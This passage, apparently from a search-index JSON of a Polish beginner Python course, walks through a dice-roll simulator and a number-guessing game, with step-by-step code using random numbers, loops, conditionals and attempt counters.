6:\n        szostki += 1\n</code></pre> <p>Podobnie jak w przypadku p\u0119tli, instrukcje wewn\u0105trz instrukcji warunkowej musz\u0105 mie\u0107 dodatkowe wci\u0119cie. Pami\u0119tajmy, \u017ce t\u0119 operacj\u0119 musimy wykona\u0107 po ka\u017cdym rzucie ko\u015bci\u0105, tzn. wewn\u0105trz p\u0119tli. Pami\u0119tajmy wi\u0119c o wci\u0119ciu. </p> <p>Warning</p> <p>Uwaga</p> <p>Zauwa\u017c, \u017ce instrukcja <code>szostki += 1</code> ma podw\u00f3jne wci\u0119cie, poniewa\u017c znajduje si\u0119 wewn\u0105trz p\u0119tli i wewn\u0105trz instrukcji warunkowej.</p>"},{"location":"learning-by-games/python/introduction/dice-simulator/#wypisujemy-liczbe-wylosowanych-szostek","title":"Wypisujemy liczb\u0119 wylosowanych sz\u00f3stek","text":"<p>Na koniec, po wszystkich rzutach,  czyli ju\u017c po wyj\u015bciu z p\u0119tli (a wi\u0119c bez wci\u0119cia), wypisujemy liczb\u0119 wylosowanych sz\u00f3stek:</p> <pre><code>print(\"Sz\u00f3stka wypad\u0142a\", szostki, \"razy\")\n</code></pre>"},{"location":"learning-by-games/python/introduction/dice-simulator/#peen-program-z-komentarzami_2","title":"Pe\u0142en program z komentarzami","text":"<pre><code># Importujemy bibliotek\u0119, kt\u00f3ra pozwoli nam generowa\u0107 losowe liczby\nimport random\n\n# Wczytujemy od u\u017cytkownika liczb\u0119 rzut\u00f3w ko\u015bci\u0105, kt\u00f3re mamy zasymulowa\u0107\nile_razy = int(input(\"Podaj liczb\u0119 rzut\u00f3w ko\u015bci\u0105: \"))\n\n# B\u0119dziemy zlicza\u0107, ile razy wypad\u0142a warto\u015b\u0107 6\n# Zliczanie zaczynamy od zera\nszostki = 0\n\n# W p\u0119tli od 0 do liczby rzut\u00f3w minus 1\nfor i in range(ile_razy):\n    # Symulujemy rzut ko\u015bci\u0105 losuj\u0105c liczb\u0119 ca\u0142kowit\u0105 z przedzia\u0142u od 1 do 6\n    wynik = random.randint(1, 6)\n\n    # Wypisujemy wylosowan\u0105 warto\u015b\u0107 na ekranie\n    print(\"Ko\u015bci zosta\u0142y rzucone. Wynik to:\", wynik)\n\n    # Je\u017celi wylosowali\u015bmy warto\u015b\u0107 6\n    if wynik == 6:\n        # To zwi\u0119kszamy licznik wylosowanych sz\u00f3stek\n        szostki += 1\n\n# Wypisujemy, ile razy wypad\u0142a sz\u00f3stka\nprint(\"Sz\u00f3stka wypad\u0142a\", szostki, \"razy\")\n</code></pre>"},{"location":"learning-by-games/python/introduction/dice-simulator/#testujemy-dziaanie_2","title":"Testujemy dzia\u0142anie","text":"<p>Czas uruchomi\u0107 finaln\u0105 wersj\u0119 naszego symulatora rzutu ko\u015bci\u0105! Ile sz\u00f3stek Tobie uda si\u0119 wylosowa\u0107?</p> <p>Poni\u017cej mo\u017cesz tak\u017ce przetestowa\u0107 dzia\u0142anie programu.</p> <p>https://replit.com/@damiankurpiewski/Kosci3</p> <p>Info</p> <p>Spr\u00f3buj uruchomi\u0107 program kilka razy, aby zobaczy\u0107, ile sz\u00f3stek uda Ci si\u0119 wylosowa\u0107!</p>"},{"location":"learning-by-games/python/introduction/dice-simulator/#zadania-dodatkowe","title":"Zadania dodatkowe","text":"<ol> <li>Spr\u00f3buj zmodyfikowa\u0107 program ze zliczaniem tak, aby zlicza\u0142 nie wyst\u0105pienia sz\u00f3stki, a zadanej przez u\u017cytkownika warto\u015bci.</li> <li>Spr\u00f3buj zmodyfikowa\u0107 powy\u017csze programy tak, aby umo\u017cliwi\u0107 rzut ko\u015bci\u0105 o dowolnej, wybranej przez u\u017cytkownika, liczbie \u015bcian.</li> </ol>"},{"location":"learning-by-games/python/introduction/guessing-game/","title":"Gra w zgadywanie","text":""},{"location":"learning-by-games/python/introduction/guessing-game/#wstep","title":"Wst\u0119p","text":"<p>Stworzymy kolejn\u0105, prost\u0105 gr\u0119 tekstow\u0105: gr\u0119 w zgadywanie! Regu\u0142y s\u0105 proste: najpierw komputer losuje liczb\u0119 z pewnego przedzia\u0142u, a nast\u0119pnie u\u017cytkownik pr\u00f3buje j\u0105 odgadn\u0105\u0107.</p>"},{"location":"learning-by-games/python/introduction/guessing-game/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Wybierania losowej liczby.</li> <li>Korzystania z p\u0119tli warunkowej.</li> <li>Korzystania z instrukcji warunkowych.</li> <li>Zliczania liczby przebieg\u00f3w p\u0119tli.</li> </ul>"},{"location":"learning-by-games/python/introduction/guessing-game/#proste-zgadywanie","title":"Proste zgadywanie","text":"<p>Zaczynamy od prostego zgadywania. Komputer losuje liczb\u0119 od \\(1\\) do \\(10\\), a u\u017cytkownik pr\u00f3buje j\u0105 odgadn\u0105\u0107. Gra b\u0119dzie si\u0119 toczy\u0107 dop\u00f3ki u\u017cytkownik nie odgadnie wylosowanej liczby. </p>"},{"location":"learning-by-games/python/introduction/guessing-game/#losujemy-ukryta-liczbe","title":"Losujemy ukryt\u0105 liczb\u0119","text":"<p>Poniewa\u017c b\u0119dziemy losowa\u0107 liczb\u0119, potrzebna nam jest biblioteka do liczb losowych, kt\u00f3r\u0105 importujemy:</p> <pre><code>import random\n</code></pre> <p>Teraz mo\u017cemy wylosowa\u0107 liczb\u0119 od \\(1\\) do \\(10\\), kt\u00f3r\u0105 zapiszemy w zmiennej <code>ukryta</code>:</p> <pre><code>ukryta = random.randint(1, 10)\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#interakcja-z-uzytkownikiem","title":"Interakcja z u\u017cytkownikiem","text":"<p>Przyszed\u0142 czas na komunikacj\u0119 z u\u017cytkownikiem. Najpierw u\u017cytkownik wprowadzi jak\u0105\u015b liczb\u0119, nast\u0119pnie komputer sprawdzi, czy jest ona taka sama, jak wylosowana na pocz\u0105tku warto\u015b\u0107. Je\u017celi nie, to u\u017cytkownik b\u0119dzie mia\u0142 kolejn\u0105 pr\u00f3b\u0119. I tak w k\u00f3\u0142ko, a\u017c nie odgadnie.</p> <p>Mo\u017cna si\u0119 domy\u015ble\u0107, \u017ce b\u0119dziemy potrzebowali p\u0119tli. Nie wiemy jednak, ile pr\u00f3b b\u0119dzie potrzebowa\u0142 wykona\u0107 u\u017cytkownik, zanim uda mu si\u0119 odgadn\u0105\u0107. Mo\u017ce wystarczy jedna pr\u00f3ba, a mo\u017ce b\u0119dzie potrzeba ich \\(10\\). Jak wi\u0119c zastosowa\u0107 p\u0119tl\u0119?</p>"},{"location":"learning-by-games/python/introduction/guessing-game/#wczytujemy-liczbe-od-uzytkownika","title":"Wczytujemy liczb\u0119 od u\u017cytkownika","text":"<p>Zastanowimy si\u0119 nad tym za chwil\u0119. Na razie wczytajmy pierwsz\u0105 pr\u00f3b\u0119 u\u017cytkownika:</p> <pre><code>liczba = int(input(\"Podaj liczb\u0119: \"))\n</code></pre> <p>Warning</p> <p>Pami\u0119tamy, \u017ceby skorzysta\u0107 z polecenia <code>int</code>, poniewa\u017c potrzebujemy liczb\u0119, a nie tekst!</p>"},{"location":"learning-by-games/python/introduction/guessing-game/#zgadujemy-az-do-skutku","title":"Zgadujemy a\u017c do skutku","text":"<p>Teraz chcieliby\u015bmy sprawdzi\u0107, czy u\u017cytkownik odgad\u0142, a je\u017celi nie, to powt\u00f3rzy\u0107 operacj\u0119 wczytania liczby. Spr\u00f3bujmy to sformu\u0142owa\u0107 inaczej: chcemy wczytywa\u0107 liczby od u\u017cytkownika, dop\u00f3ki ten nie odgadnie ukrytej warto\u015bci. Innymi s\u0142owy, dop\u00f3ki warto\u015bci zmiennych <code>liczba</code> i <code>ukryta</code> b\u0119d\u0105 r\u00f3\u017cne, to b\u0119dziemy powtarza\u0107 operacj\u0119 wczytania liczby od u\u017cytkownika.</p> <p>Do zrealizowania tego zadania pos\u0142u\u017cy nam p\u0119tla warunkowa <code>while</code>:</p> <pre><code>while liczba != ukryta:\n</code></pre> <p>Info</p> <p>Do sprawdzenia, czy dwie warto\u015bci s\u0105 od siebie r\u00f3\u017cne, u\u017cywamy <code>!=</code></p> <p>Dop\u00f3ki u\u017cytkownik nie odgad\u0142 poprawnie, b\u0119dziemy wykonywa\u0107 dwie operacje: wypiszemy stosowny komunikat i poprosimy u\u017cytkownika o podanie kolejnej liczby. Te dwie operacje wykonamy w p\u0119tli, pami\u0119tamy wi\u0119c o wci\u0119ciach.</p> <pre><code>while liczba != ukryta:\n    print(\"Nie\")\n    liczba = int(input(\"Podaj liczb\u0119: \"))\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#powiadamiamy-uzytkownika-o-sukcesie","title":"Powiadamiamy u\u017cytkownika o sukcesie","text":"<p>Teraz pozosta\u0142o nam wypisa\u0107 stosowny komunikat, gdy u\u017cytkownik odgadnie ukryt\u0105 warto\u015b\u0107. Jak sprawdzi\u0107, \u017ce u\u017cytkownikowi si\u0119 uda\u0142o? Mogliby\u015bmy por\u00f3wna\u0107 ze sob\u0105 warto\u015bci zmiennych <code>liczba</code> i <code>ukryta</code>. Nie ma jednak takiej potrzeby. Z naszej p\u0119tli mo\u017cemy wyj\u015b\u0107 tylko wtedy, gdy jej warunek przestanie by\u0107 prawdziwy, tzn. gdy <code>liczba</code> i <code>ukryta</code> b\u0119d\u0105 sobie r\u00f3wne. To znaczy, \u017ce gdy wyjdziemy z p\u0119tli, u\u017cytkownik odgad\u0142 poprawnie. W takim razie, po wyj\u015bciu z p\u0119tli (czyli bez wci\u0119cia) wypisujemy stosowny komunikat:</p> <pre><code>print(\"Tak!\")\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#pena-gra-z-komentarzami","title":"Pe\u0142na gra z komentarzami","text":"<pre><code># Importujemy bibliotek\u0119, kt\u00f3ra pozwoli nam generowa\u0107 losowe liczby\nimport random\n\n# Losujemy liczb\u0119 ca\u0142kowit\u0105 z przedzia\u0142u od 1 do 10\nukryta = random.randint(1, 10)\n\n# Wczytujemy liczb\u0119 od u\u017cytkownika\nliczba = int(input(\"Podaj liczb\u0119: \"))\n\n# Dop\u00f3ki u\u017cytkownik nie odgad\u0142, jak\u0105 liczb\u0119 wylosowa\u0142 komputer\nwhile liczba != ukryta:\n    # Wypisujemy stosowny komunikat na ekranie\n    print(\"Nie\")\n\n    # Ponownie prosimy u\u017cytkownika o podanie liczby\n    liczba = int(input(\"Podaj liczb\u0119: \"))\n\n# Skoro wyszli\u015bmy z p\u0119tli, to znaczy, \u017ce u\u017cytkownik odgad\u0142 wylosowan\u0105 przez komputer liczb\u0119\n# Wypisujemy wi\u0119c stosowny komunikat\nprint(\"Tak!\")\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#testujemy-dziaanie","title":"Testujemy dzia\u0142anie","text":"<p>Uruchom swoj\u0105 gr\u0119. Ile pr\u00f3b zaj\u0119\u0142o Ci odgadni\u0119cie liczby? Uruchom j\u0105 ponownie. Za kt\u00f3rym razem teraz uda\u0142o Ci si\u0119 odgadn\u0105\u0107?</p> <p>Mo\u017cesz tak\u017ce przetestowa\u0107 dzia\u0142anie gry poni\u017cej.</p> <p>https://replit.com/@damiankurpiewski/Zgadywanie1#main.py</p>"},{"location":"learning-by-games/python/introduction/guessing-game/#zgadywanie-ciepo-zimno","title":"Zgadywanie ciep\u0142o-zimno","text":"<p>Zgadywanie w \"ciemno\" nie jest wcale takie proste. Oczywi\u015bcie, gdy mamy odgadn\u0105\u0107 liczb\u0119 od \\(1\\) do \\(10\\) to w najgorszym przypadku b\u0119dziemy potrzebowali dziesi\u0119ciu pr\u00f3b, \u017ceby w ko\u0144cu odgadn\u0105\u0107 prawid\u0142owo. Co jednak, gdy chcieliby\u015bmy pyta\u0107 o liczby z wi\u0119kszego przedzia\u0142u, np. od \\(1\\) do \\(100\\), albo od \\(1\\) do \\(1000\\)? Bez \u017cadnych wskaz\u00f3wek odgadni\u0119cie wylosowanej warto\u015bci b\u0119dzie bardzo trudne.</p> <p>Dlatego zmodyfikujemy nasz\u0105 gr\u0119, by da\u0107 graczowi wi\u0119ksze szanse na szybkie odgadni\u0119cie liczby. Dodamy co\u015b w rodzaju podpowiedzi jakie wyst\u0119puj\u0105 w grze \"ciep\u0142o-zimno\". Dla tych, kt\u00f3rzy nie znaj\u0105 tej gry, kr\u00f3tkie wyja\u015bnienie. Jeden z graczy chowa jaki\u015b przedmiot w pomieszczeniu, a drugi pr\u00f3buje go odnale\u017a\u0107. Gdy zbli\u017ca si\u0119 do schowanego przedmiotu dostaje podpowied\u017a \"ciep\u0142o\", a gdy idzie w z\u0142ym kierunku: \"zimno\".</p> <p>Podobnie w naszej grze damy graczowi jedn\u0105 z dw\u00f3ch podpowiedzi: \"mniejsza\" lub \"wi\u0119ksza\". W ten spos\u00f3b, po nieudanej pr\u00f3bie odgadni\u0119cia warto\u015bci gracz b\u0119dzie wiedzia\u0142, czy powinien szuka\u0107 liczby wi\u0119kszej, czy te\u017c mniejszej, co pomo\u017ce mu szybciej poda\u0107 prawid\u0142ow\u0105 odpowied\u017a. </p>"},{"location":"learning-by-games/python/introduction/guessing-game/#wyswietlanie-podpowiedzi","title":"Wy\u015bwietlanie podpowiedzi","text":"<p>Zabierzmy si\u0119 za modyfikacj\u0119 naszej gry. Naszym zadaniem, jak ju\u017c ustalili\u015bmy, jest dodanie wy\u015bwietlania podpowiedzi dla gracza. Aby to zrealizowa\u0107, musimy odpowiedzie\u0107 na dwa pytania:</p> <ol> <li>Kiedy wy\u015bwietla\u0107 podpowied\u017a?</li> <li>Od czego b\u0119dzie zale\u017cna tre\u015b\u0107 podpowiedzi?</li> </ol> <p>Zacznijmy od pierwszego pytania. Aby ca\u0142a zabawa mia\u0142a sens, gracz powinien dostawa\u0107 podpowied\u017a po ka\u017cdej nieudanej pr\u00f3bie. To znaczy, \u017ce podpowied\u017a b\u0119dziemy wy\u015bwietla\u0107 w p\u0119tli.</p> <p>Nasza podpowied\u017a b\u0119dzie uzale\u017cniona od liczby podanej przez gracza i ukrytej warto\u015bci. M\u00f3wi\u0105c precyzyjniej, musimy por\u00f3wna\u0107 te dwie liczby ze sob\u0105 i wy\u015bwietli\u0107 odpowiedni komunikat:</p> <ul> <li>Je\u017celi ukryta warto\u015b\u0107 jest mniejsza od podanej przez gracza liczby, wy\u015bwietlimy podpowied\u017a \"Mniejsza!\"</li> <li>Je\u017celi ukryta warto\u015b\u0107 jest wi\u0119ksza od podanej przez gracza liczby, wy\u015bwietlimy podpowied\u017a \"Wi\u0119ksza!\"</li> </ul>"},{"location":"learning-by-games/python/introduction/guessing-game/#sprawdzamy-czy-ukryta-jest-mniejsza","title":"Sprawdzamy, czy ukryta jest mniejsza","text":"<p>Zacznijmy od pierwszego komunikatu. Musimy por\u00f3wna\u0107 ze sob\u0105 warto\u015bci zmiennych <code>ukryta</code> i <code>liczba</code>. Je\u017celi <code>ukryta</code> jest mniejsza od <code>liczba</code>, to wy\u015bwietlamy komunikat \"Mniejsza!\".</p> <p>Tworzymy wi\u0119c odpowiedni\u0105 instrukcj\u0119 warunkow\u0105 i dopisujemy j\u0105 do naszej gry. Pami\u0119tajmy, \u017ce t\u0119 instrukcj\u0119 musimy doda\u0107 wewn\u0105trz p\u0119tli, poniewa\u017c podpowiedzi b\u0119dziemy wy\u015bwietla\u0107 po ka\u017cdej nieudanej pr\u00f3bie gracza. Pami\u0119tamy wi\u0119c o wci\u0119ciach i dopisujemy, zaraz na pocz\u0105tku naszej p\u0119tli:</p> <pre><code>    if ukryta &lt; liczba:\n        print(\"Mniejsza!\")\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#sprawdzamy-czy-ukryta-jest-wieksza","title":"Sprawdzamy, czy ukryta jest wi\u0119ksza","text":"<p>Teraz pozosta\u0142o nam sprawdzi\u0107 drugi przypadek, gdy ukryta warto\u015b\u0107 jest wi\u0119ksza od podanej przez gracza liczby. Post\u0119pujemy podobnie jak wcze\u015bniej i dopisujemy, zaraz pod poprzedni\u0105 instrukcj\u0105:</p> <pre><code>    if ukryta &gt; liczba:\n        print(\"Wi\u0119ksza!\")\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#zwiekszamy-zakres","title":"Zwi\u0119kszamy zakres","text":"<p>Aby urozmaici\u0107 i utrudni\u0107 nasz\u0105 gr\u0119 zmie\u0144my zakres, z kt\u00f3rego losowana jest ukryta warto\u015b\u0107:</p> <pre><code>ukryta = random.randint(1, 100)\n</code></pre> <p>To wszystko. Pozosta\u0142o nam uruchomi\u0107 nasz\u0105 gr\u0119 i j\u0105 przetestowa\u0107!</p>"},{"location":"learning-by-games/python/introduction/guessing-game/#pena-gra-z-komentarzami_1","title":"Pe\u0142na gra z komentarzami","text":"<pre><code># Importujemy bibliotek\u0119, kt\u00f3ra pozwoli nam generowa\u0107 losowe liczby\nimport random\n\n# Losujemy liczb\u0119 ca\u0142kowit\u0105 z przedzia\u0142u od 1 do 100\nukryta = random.randint(1, 100)\n\n# Wczytujemy liczb\u0119 od u\u017cytkownika\nliczba = int(input(\"Podaj liczb\u0119: \"))\n\n# Dop\u00f3ki u\u017cytkownik nie odgad\u0142, jak\u0105 liczb\u0119 wylosowa\u0142 komputer\nwhile liczba != ukryta:\n    # Je\u017celi wylosowana warto\u015b\u0107 jest mniejsza od tej podanej przez u\u017cytkownika\n    if ukryta &lt; liczba:\n        # Informujemy u\u017cytkownika o tym, \u017ce warto\u015b\u0107, kt\u00f3rej szuka, jest mniejsza\n        print(\"Mniejsza!\")\n\n    # Je\u017celi wylosowana warto\u015b\u0107 jest wi\u0119ksza od tej podanej przez u\u017cytkownika\n    if ukryta &gt; liczba:\n        # Informujemy u\u017cytkownika o tym, \u017ce warto\u015b\u0107, kt\u00f3rej szuka, jest wi\u0119ksza\n        print(\"Wi\u0119ksza!\")\n\n    # Ponownie prosimy u\u017cytkownika o podanie liczby\n    liczba = int(input(\"Podaj liczb\u0119: \"))\n\n# Skoro wyszli\u015bmy z p\u0119tli, to znaczy, \u017ce u\u017cytkownik odgad\u0142 wylosowan\u0105 przez komputer liczb\u0119\n# Wypisujemy wi\u0119c stosowny komunikat\nprint(\"Trafiona!\")\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#testujemy-dziaanie_1","title":"Testujemy dzia\u0142anie","text":"<p>Uruchom gr\u0119 i spr\u00f3buj odgadn\u0105\u0107 liczb\u0119. Czy potrafisz wymy\u015ble\u0107 strategi\u0119, kt\u00f3ra pozwoli Ci odgadn\u0105\u0107 w jak najmniejszej liczbie pr\u00f3b?</p> <p>Poni\u017cej mo\u017cesz tak\u017ce przetestowa\u0107 dzia\u0142anie gry.</p> <p>https://replit.com/@damiankurpiewski/Zgadywanie2</p>"},{"location":"learning-by-games/python/introduction/guessing-game/#zgadywanie-ze-zliczeniem-prob","title":"Zgadywanie ze zliczeniem pr\u00f3b","text":"<p>Nasza modyfikacja \"ciep\u0142o-zimno\" powinna u\u0142atwi\u0107 zgadywanie. Ile jednak pr\u00f3b zazwyczaj potrzebujemy, \u017ceby odgadn\u0105\u0107? Policzmy to!</p>"},{"location":"learning-by-games/python/introduction/guessing-game/#dodajemy-licznik","title":"Dodajemy licznik","text":"<p>Na pocz\u0105tku dodajemy do programu licznik pr\u00f3b. Nazwijmy t\u0119 zmienn\u0105 <code>ile_prob</code>. Na pocz\u0105tku przypiszemy jej warto\u015b\u0107 \\(1\\), poniewa\u017c zawsze zaczynamy od pierwszej pr\u00f3by (mniej nie mo\u017cemy mie\u0107!).</p> <p>Nasz\u0105 now\u0105 zmienn\u0105 dopisujemy na pocz\u0105tku ca\u0142ego programu, np. po wylosowaniu ukrytej warto\u015bci.</p> <pre><code>ile_prob = 1\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#zliczanie-prob","title":"Zliczanie pr\u00f3b","text":"<p>Kiedy zlicza\u0107 pr\u00f3by? Powinni\u015bmy zwi\u0119ksza\u0107 nasz licznik po ka\u017cdej nieudanej pr\u00f3bie, a wi\u0119c wewn\u0105trz p\u0119tli, np. po wy\u015bwietleniu podpowiedzi.</p> <pre><code>    ile_prob += 1\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#wyswietlamy-liczbe-prob","title":"Wy\u015bwietlamy liczb\u0119 pr\u00f3b","text":"<p>Na ko\u0144cu naszego programu, gdy ju\u017c wy\u015bwietlimy komunikat o trafieniu, wypiszemy tak\u017ce liczb\u0119 pr\u00f3b.</p> <pre><code>print(\"Liczba pr\u00f3b:\", ile_prob)\n</code></pre> <p>To wszystko! Testujemy i gramy!</p> <p>Info</p> <p>Zastan\u00f3w si\u0119, jak\u0105 strategi\u0119 nale\u017cy obra\u0107, by za ka\u017cdym razem mie\u0107 jak najmniej pr\u00f3b.</p> <p>Spr\u00f3buj tak\u017ce zwi\u0119kszy\u0107 zakres, z kt\u00f3rego losowana jest ukryta warto\u015b\u0107.</p>"},{"location":"learning-by-games/python/introduction/guessing-game/#pena-gra-z-komentarzami_2","title":"Pe\u0142na gra z komentarzami","text":"<pre><code># Importujemy bibliotek\u0119, kt\u00f3ra pozwoli nam generowa\u0107 losowe liczby\nimport random\n\n# Losujemy liczb\u0119 ca\u0142kowit\u0105 z przedzia\u0142u od 1 do 100\nukryta = random.randint(1, 100)\n\n# B\u0119dziemy zlicza\u0107 liczb\u0119 pr\u00f3b, kt\u00f3re potrzebowa\u0142 u\u017cytkownik, \u017ceby odgadn\u0105\u0107 warto\u015b\u0107\n# Zaczynamy liczy\u0107 od 1\nile_prob = 1\n\n# Wczytujemy liczb\u0119 od u\u017cytkownika\nliczba = int(input(\"Podaj liczb\u0119: \"))\n\n# Dop\u00f3ki u\u017cytkownik nie odgad\u0142, jak\u0105 liczb\u0119 wylosowa\u0142 komputer\nwhile liczba != ukryta:\n    # Je\u017celi wylosowana warto\u015b\u0107 jest mniejsza od tej podanej przez u\u017cytkownika\n    if ukryta &lt; liczba:\n        # Informujemy u\u017cytkownika o tym, \u017ce warto\u015b\u0107, kt\u00f3rej szuka, jest mniejsza\n        print(\"Mniejsza!\")\n\n    # Je\u017celi wylosowana warto\u015b\u0107 jest wi\u0119ksza od tej podanej przez u\u017cytkownika\n    if ukryta &gt; liczba:\n        # Informujemy u\u017cytkownika o tym, \u017ce warto\u015b\u0107, kt\u00f3rej szuka, jest wi\u0119ksza\n        print(\"Wi\u0119ksza!\")\n\n    # Zliczamy kolejn\u0105 pr\u00f3b\u0119 zwi\u0119kszaj\u0105c warto\u015b\u0107 licznika ile_prob\n    ile_prob += 1\n\n    # Ponownie prosimy u\u017cytkownika o podanie liczby\n    liczba = int(input(\"Podaj liczb\u0119: \"))\n\n# Skoro wyszli\u015bmy z p\u0119tli, to znaczy, \u017ce u\u017cytkownik odgad\u0142 wylosowan\u0105 przez komputer liczb\u0119\n# Wypisujemy wi\u0119c stosowny komunikat\nprint(\"Trafiona!\")\n\n# Wypisujemy tak\u017ce liczb\u0119 pr\u00f3b podj\u0119tych przez u\u017cytkownika\nprint(\"Liczba pr\u00f3b:\", ile_prob)\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#testujemy-dziaanie_2","title":"Testujemy dzia\u0142anie","text":"<p>Uruchom gr\u0119 kilkukrotnie. Jaka by\u0142a najmniejsza liczba pr\u00f3b potrzebna do odgadni\u0119cia liczby? A jaka by\u0142a najwi\u0119ksza?</p> <p>Poni\u017cej tak\u017ce mo\u017cesz przetestowa\u0107 dzia\u0142anie gry.</p> <p>https://replit.com/@damiankurpiewski/Zgadywanie3</p>"},{"location":"learning-by-games/python/introduction/guessing-game/#zgadywanie-z-wasnego-zakresu","title":"Zgadywanie z w\u0142asnego zakresu","text":"<p>Dodajmy ostatni\u0105 modyfikacj\u0119 do naszej gry, a mianowicie zakres podawany przez gracza.</p>"},{"location":"learning-by-games/python/introduction/guessing-game/#wczytujemy-zakres","title":"Wczytujemy zakres","text":"<p>Na samym pocz\u0105tku (zaraz po zaimportowaniu biblioteki random) prosimy u\u017cytkownika o podanie zakresu, z kt\u00f3rego ma zosta\u0107 wylosowana ukryta warto\u015b\u0107.</p> <pre><code>print(\"Podaj zakres\")\n\nod = int(input(\"Od: \"))\n\ndo = int(input(\"Do: \"))\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#stosujemy-zakres","title":"Stosujemy zakres","text":"<p>Gdy ju\u017c wczytali\u015bmy od gracza zakres, nale\u017cy go wykorzysta\u0107 przy losowaniu warto\u015bci. W tym celu modyfikujemy instrukcj\u0119 losowania ukrytej warto\u015bci, podaj\u0105c nowy zakres.</p> <pre><code>ukryta = random.randint(od, do)\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#testujemy","title":"Testujemy","text":"<p>Uruchamiamy gr\u0119 i sprawdzamy, czy dzia\u0142a poprawnie. Czy dla ka\u017cdego zakresu nasza gra dzia\u0142a prawid\u0142owo?</p>"},{"location":"learning-by-games/python/introduction/guessing-game/#sprawdzamy-poprawnosc-zakresu","title":"Sprawdzamy poprawno\u015b\u0107 zakresu","text":"<p>Poniewa\u017c nie mamy wp\u0142ywu na to, co poda u\u017cytkownik, nale\u017cy zweryfikowa\u0107 to, co wpisa\u0142. Sprawdzamy wi\u0119c, czy zakres podany przez gracza jest poprawny. Jak sprawdzi\u0107 poprawno\u015b\u0107 zakresu? To proste. Jego pocz\u0105tek musi by\u0107 mniejszy od ko\u0144ca. Je\u015bli tak nie jest, to zakres nie jest poprawny.</p> <p>Zaraz po wczytaniu zakresu dodajemy sprawdzenie jego poprawno\u015bci. Je\u017celi nie jest poprawny, to wy\u015bwietlamy stosowny komunikat i ko\u0144czymy dzia\u0142anie gry za pomoc\u0105 polecenia <code>exit()</code>.</p> <pre><code>if od &gt; do:\n    print(\"B\u0142\u0119dny zakres!\")\n    exit()\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#testujemy-po-raz-drugi","title":"Testujemy po raz drugi","text":"<p>Ponownie uruchamiamy gr\u0119 i sprawdzamy jej dzia\u0142anie. Czy teraz wszystko dzia\u0142a poprawnie?</p> <p>Warning</p> <p>Uwaga</p> <p>Dla u\u0142atwienia zak\u0142adamy, \u017ce gracz podaje do programu prawid\u0142owe liczby ca\u0142kowite. Nie zajmujemy si\u0119 przypadkami, gdy gracz poda liczb\u0119 u\u0142amkow\u0105, albo zamiast liczby wpisze jaki\u015b tekst.</p>"},{"location":"learning-by-games/python/introduction/guessing-game/#pena-gra-z-komentarzami_3","title":"Pe\u0142na gra z komentarzami","text":"<pre><code># Importujemy bibliotek\u0119, kt\u00f3ra pozwoli nam generowa\u0107 losowe liczby\nimport random\n\n# Prosimy u\u017cytkownika o podanie zakresu, z kt\u00f3rego ma by\u0107 wylosowana liczba\nprint(\"Podaj zakres\")\n\n# Wczytujemy pocz\u0105tek zakresu i zamieniamy na liczb\u0119 ca\u0142kowit\u0105\nod = int(input(\"Od: \"))\n\n# Wczytujemy koniec zakresu i zamieniamy na liczb\u0119 ca\u0142kowit\u0105\ndo = int(input(\"Do: \"))\n\n# Je\u017celi pocz\u0105tek zakresu jest wi\u0119kszy od jego ko\u0144ca\nif od &gt; do:\n    # To znaczy, \u017ce zakres jest b\u0142\u0119dny, informujemy wi\u0119c o tym u\u017cytkownika\n    print(\"B\u0142\u0119dny zakres!\")\n    # A nast\u0119pnie ko\u0144czymy dzia\u0142anie programu\n    exit()\n\n# Losujemy liczb\u0119 ca\u0142kowit\u0105 z przedzia\u0142u podanego przez u\u017cytkownika\nukryta = random.randint(od, do)\n\n# B\u0119dziemy zlicza\u0107 liczb\u0119 pr\u00f3b, kt\u00f3re potrzebowa\u0142 u\u017cytkownik, \u017ceby odgadn\u0105\u0107 warto\u015b\u0107\n# Zaczynamy liczy\u0107 od 1\nile_prob = 1\n\n# Wczytujemy liczb\u0119 od u\u017cytkownika\nliczba = int(input(\"Podaj liczb\u0119: \"))\n\n# Dop\u00f3ki u\u017cytkownik nie odgad\u0142, jak\u0105 liczb\u0119 wylosowa\u0142 komputer\nwhile liczba != ukryta:\n    # Je\u017celi wylosowana warto\u015b\u0107 jest mniejsza od tej podanej przez u\u017cytkownika\n    if ukryta &lt; liczba:\n        # Informujemy u\u017cytkownika o tym, \u017ce warto\u015b\u0107, kt\u00f3rej szuka, jest mniejsza\n        print(\"Mniejsza!\")\n\n    # Je\u017celi wylosowana warto\u015b\u0107 jest wi\u0119ksza od tej podanej przez u\u017cytkownika\n    if ukryta &gt; liczba:\n        # Informujemy u\u017cytkownika o tym, \u017ce warto\u015b\u0107, kt\u00f3rej szuka, jest wi\u0119ksza\n        print(\"Wi\u0119ksza!\")\n\n    # Zliczamy kolejn\u0105 pr\u00f3b\u0119 zwi\u0119kszaj\u0105c warto\u015b\u0107 licznika ile_prob\n    ile_prob += 1\n\n    # Ponownie prosimy u\u017cytkownika o podanie liczby\n    liczba = int(input(\"Podaj liczb\u0119: \"))\n\n# Skoro wyszli\u015bmy z p\u0119tli, to znaczy, \u017ce u\u017cytkownik odgad\u0142 wylosowan\u0105 przez komputer liczb\u0119\n# Wypisujemy wi\u0119c stosowny komunikat\nprint(\"Trafiona!\")\n\n# Wypisujemy tak\u017ce liczb\u0119 pr\u00f3b podj\u0119tych przez u\u017cytkownika\nprint(\"Liczba pr\u00f3b:\", ile_prob)\n</code></pre>"},{"location":"learning-by-games/python/introduction/guessing-game/#testujemy-dziaanie_3","title":"Testujemy dzia\u0142anie","text":"<p>Uruchom swoj\u0105 sko\u0144czon\u0105 gr\u0119. Spr\u00f3buj zgadywa\u0107 dla r\u00f3\u017cnych przedzia\u0142\u00f3w. Jaki jest najwi\u0119kszy przedzia\u0142, w kt\u00f3rym uda Ci si\u0119 